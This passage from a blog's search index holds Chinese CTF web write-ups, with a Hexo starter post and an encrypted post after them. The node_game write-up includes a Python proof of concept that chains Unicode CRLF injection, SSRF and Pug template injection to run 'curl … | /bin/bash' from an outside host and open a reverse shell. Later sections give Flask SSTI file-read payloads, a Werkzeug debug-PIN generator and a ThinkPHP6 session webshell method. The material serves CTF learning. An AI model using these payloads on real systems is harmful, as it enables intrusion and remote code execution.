class="headerlink" title="node_game"></a>node_game</h3><p><strong>源代码：</strong></p><pre><code>var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug');var morgan = require('morgan');const multer = require('multer');app.use(multer({dest: './dist'}).array('file'));app.use(morgan('short'));app.use("/uploads",express.static(path.join(__dirname, '/uploads')))app.use("/template",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) {    var action = req.query.action?req.query.action:"index";    if( action.includes("/") || action.includes("\\") ){        res.send("Errrrr, You have been Blocked");    }    file = path.join(__dirname + '/template/'+ action +'.pug');    var html = pug.renderFile(file);    res.send(html);});app.post('/file_upload', function(req, res){    var ip = req.connection.remoteAddress;    var obj = {        msg: '',    }    if (!ip.includes('127.0.0.1')) {        obj.msg="only admin's ip can use it"        res.send(JSON.stringify(obj));        return     }    fs.readFile(req.files[0].path, function(err, data){        if(err){            obj.msg = 'upload failed';            res.send(JSON.stringify(obj));        }else{            var file_path = '/uploads/' + req.files[0].mimetype +"/";            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if(!fs.existsSync(__dirname + file_path)){                try {                    fs.mkdirSync(__dirname + file_path)                } catch (error) {                    obj.msg = "file type error";                    res.send(JSON.stringify(obj));                    return                }            }            try {                fs.writeFileSync(dir_file,data)                obj = {                    msg: 'upload success',                    filename: file_path + file_name                }             } catch (error) {                obj.msg = 'upload failed';            }            res.send(JSON.stringify(obj));            }    })})app.get('/source', function(req, res) {    res.sendFile(path.join(__dirname + '/template/source.txt'));});app.get('/core', function(req, res) {    var q = req.query.q;    var resp = "";    if (q) {        var url = 'http://localhost:8081/source?' + q        console.log(url)        var trigger = blacklist(url);        if (trigger === true) {            res.send("error occurs!            ");                    } else {                        try {                            http.get(url, function(resp) {                                resp.setEncoding('utf8');                                resp.on('error', function(err) {                                if (err.code === "ECONNRESET") {                                 console.log("Timeout occurs");                                 return;                                }                               });                                resp.on('data', function(chunk) {                                    try {                                     resps = chunk.toString();                                     res.send(resps);                                    }catch (e) {                                       res.send(e.message);                                    }                                }).on('error', (e) =&gt; {                                     res.send(e.message);});                            });                        } catch (error) {                            console.log(error);                        }                    }                } else {                    res.send("search param 'q' missing!");                }            })            function blacklist(url) {                var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];                var arrayLen = evilwords.length;                for (var i = 0; i &lt; arrayLen; i++) {                    const trigger = url.includes(evilwords[i]);                    if (trigger === true) {                        return true                    }                }            }            var server = app.listen(8081, function() {                var host = server.address().address                var port = server.address().port                console.log("Example app listening at http://%s:%s", host, port)            })</code></pre><p>思路很清晰<br>/file_upload 有一个限制必须 127.0.0.1<br>先 利用node 的cve ，拆分攻击，http.get() 可以 用 unicode 字符，来CRLF和SSRF</p><p>利用SSRF上传个 文件 ，然后用pug 执行命令 </p><p>可惜一直 被 content-length 坑了 ，这个如果不精确 就会让 服务器 堵塞 30秒，到最后只剩下30分钟才发现这个问题。 难怪一直 失败， 比赛结束之后做出来了，</p><p>poc:弹shell</p><pre><code>import urllibimport requestspayload='''dasdas HTTP/1.1Host:127.0.0.1:8081connection:keep-alivePOST /file_upload HTTP/1.1Host: 123.57.212.112:33323User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://123.57.212.112:33323/?action=uploadContent-Type: multipart/form-data; boundary=---------------------------7583695899588870231116957455Content-Length: 404Connection: closeUpgrade-Insecure-Requests: 1-----------------------------7583695899588870231116957455Content-Disposition: form-data; name="file"; filename="ggg.pug"Content-Type: ../../../../../usr/src/app/uploads/-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl http://mu2766c382.zicp.vip:18430/shell | /bin/bash'))")()-----------------------------7583695899588870231116957455--GET / HTTP/1.1connection:close'''.replace("\r\n","\n")payload=payload.replace("\n","\r\n")print(payload)payload=payload.replace("\r",'\u010D').replace("\n",'\u010a').replace(' ','\u0120').replace('"','\u0122').replace("'",'\u0127').replace('-','\u012d').replace('=','\u013d').replace('/','\u012f')payload=payload.replace('o','\u016f').replace('e','\u0165').replace('|','\u017c').replace('a','\u0161')url='http://182.92.243.154:33322/core?q='req=requests.get(url+urllib.parse.quote(payload))print(req.text)</code></pre><p>这些blacklist 都可以使用 </p><p><code>replace('o','\u016f')</code></p><p><code>replace('e','\u0165')</code> 绕过</p><p>action 那里可以使用 数组绕过 <code>/</code>和 <code>\</code></p><p>然后访问 </p><pre><code>http://182.92.243.154:33322/?action[]=../../../../../../usr/src/app/uploads/ggg</code></pre><p>执行命令 </p><p>cd /</p><p>cat /flag,txt</p><h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p>python3.7</p><p>利用 SSTI 读取文件</p><p>然后 debug pin 执行命令</p><p>在 base64 decode 那里 存在SSTI，这个SSTI 执行命令的被禁了，</p><p>读取文件可以使用 </p><p><code>&lt;class 'urllib.request.URLopener'&gt;</code></p><p>这个类</p><p>使用 base64编码的 </p><pre><code>{{session['__class__'].__mro__[11].__subclasses__()}}</code></pre><p>获取 </p><pre><code>csrf_token=ImQ2ZDgzM2Q0NWYzYThjYjVmZWY2NTU3NjNhYzgxNTRhNTNjNTg1ZmUi.XlNFsg.YPgw6WxuZ6-ZC8z0v129Lf1h42g&amp;text=e3tzZXNzaW9uWydfX2NsYXNzX18nXS5fX21yb19fWzExXS5fX3N1YmNsYXNzZXNfXygpfX0= &amp;submit=%E6%8F%90%E4%BA%A4</code></pre><p>然后 读取 pin 需要的文件</p><pre><code>{{session['__class__'].__mro__[11].__subclasses__()[367]().open_file('/sys/class/net/eth0/address').read()}}</code></pre><p>base64 编码</p><p>再读取 <code>/proc/self/cgroup</code> 获取 <code>machine-id</code></p><p>读取 <code>/etc/passwd</code>获取 用户名 <code>flaskweb</code></p><p>脚本:<br><code>machine-id</code> <code>用户名</code>，<code>/sys/class/net/eth0/address</code>要自己获取</p><pre><code>import hashlibfrom itertools import chainprobably_public_bits = [    'flaskweb'# username    'flask.app',# modname    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [    '2485377957892',# str(uuid.getnode()),  /sys/class/net/eth0/address    '2760c403a7342785875fee2cf06c775c5d54803fe8436f19ce7b9e83281015c2'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode('utf-8')    h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None:    h.update(b'pinsalt')    num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink" title="easythink"></a>easythink</h3><p>thinkphp6.0的漏洞</p><p>thinkphp6.0 写入shell</p><p>session 如果是 32位 的话， 没有任何过滤就写入 session 文件，thinkphp6的session文件 默认在 <code>runtime</code> 目录下 ，所以 </p><p>构造 32 位 的session 最后四个 是 .php  ，</p><p>然后 就可以写入shell了，</p><p>至于shell的值 要用 $_SESSION[‘’] 这个来构造，很简单</p><p>随便一个用户名 ，用构造的session 登录 ，</p><p>然后 到<code>search</code>页面</p><p>要 <code>search</code> 的历史记录 会记录在session中 ，</p><p>然后就 蚁剑连接</p><p>需要执行 <code>/readflag</code>  才可以 读取flag  ，</p><p>但是有disable_function</p><p>就使用 php-gc 绕过disable_function ，</p><p>平时使用的 exp不行，多找几个类型的 ， 找另外一个 就成功了</p><h3 id="ezexpress"><a href="#ezexpress" class="headerlink" title="ezexpress"></a>ezexpress</h3><ul><li>admin  toLowerCase() 绕过</li><li>原型链污染</li></ul><p>merge() 函数可以原型链污染 opts 对象 outputFunctionName</p><p>做到一半 ，发现 可以上车 ，直接获取flag ，醉了<br>详情看<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlite</title>
      <link href="/2020/02/14/sqlite/"/>
      <url>/2020/02/14/sqlite/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="53476da6fdf978a5fc97ded658da07ad232cfd27da9b181b8914db603f672787"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/02/10/hello-world/"/>
      <url>/2020/02/10/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p>##写文章</p><pre><code>---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><pre class=" language-$xslt"><code class="language-$xslt">title    Markdown 的文件标题    文章标题，强烈建议填写此选项date    文件创建时的日期时间    发布时间，强烈建议填写此选项，且最好保证全局唯一author    根 _config.yml 中的 author    文章作者img    featureImages 中的某个值    文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpgtop    true    推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章cover    false    v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中coverImg    无    v1.0.2版本新增，表示该文章在首页轮播封面需**要显示的图片路径，如果没有，则默认使用文章的特色图片password    无    文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项toc    true    是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项mathjax    false    是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行summary    无    文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories    无    文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类tags    无    文章标签，一篇文章可以多个标签</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
